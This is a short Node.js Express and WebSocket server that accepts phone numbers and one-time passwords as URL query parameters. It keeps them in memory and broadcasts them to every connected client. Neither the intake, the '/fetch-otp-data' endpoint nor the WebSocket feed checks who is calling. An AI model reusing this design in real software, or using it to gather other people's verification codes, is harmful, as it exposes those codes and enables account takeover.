const express = require('express');
const path = require('path');
const { WebSocketServer } = require('ws'); // Import WebSocket library

const app = express();

// In-memory storage for OTPs
const otpData = [];

// Array to store connected WebSocket clients
const clients = [];

// WebSocket server setup
const wss = new WebSocketServer({ noServer: true });
wss.on('connection', (ws) => {
    console.log('New WebSocket connection');
    clients.push(ws);

    // Send existing OTP data to the newly connected client
    ws.send(JSON.stringify(otpData));

    ws.on('close', () => {
        console.log('WebSocket connection closed');
        const index = clients.indexOf(ws);
        if (index > -1) {
            clients.splice(index, 1);
        }
    });
});

// Serve static HTML from 'public' folder
app.use(express.static(path.join(__dirname, 'public')));

// Endpoint to receive phone and OTP
app.get('/', (req, res) => {
    const phone = req.query.phone;
    const otp = req.query.otp;

    if (!phone || !otp) {
        return res.status(400).json({
            message: 'Phone number and OTP are required',
            status: 'error',
        });
    }

    // Add new OTP to in-memory data
    otpData.push({ phone, otp });

    // Notify all connected WebSocket clients
    const message = JSON.stringify({ phone, otp });
    clients.forEach((ws) => ws.send(message));

    res.status(200).json({
        message: `OTP ${otp} received for phone ${phone}`,
        status: 'success',
    });
});

// Endpoint to fetch all OTP data
app.get('/fetch-otp-data', (req, res) => {
    res.json(otpData);
});

// Start the server and attach WebSocket
const server = app.listen(process.env.PORT || 3000, () => {
    console.log(`Server running on port ${process.env.PORT || 3000}`);
});

// Upgrade HTTP connections to WebSocket
server.on('upgrade', (req, socket, head) => {
    wss.handleUpgrade(req, socket, head, (ws) => {
        wss.emit('connection', ws, req);
    });
});
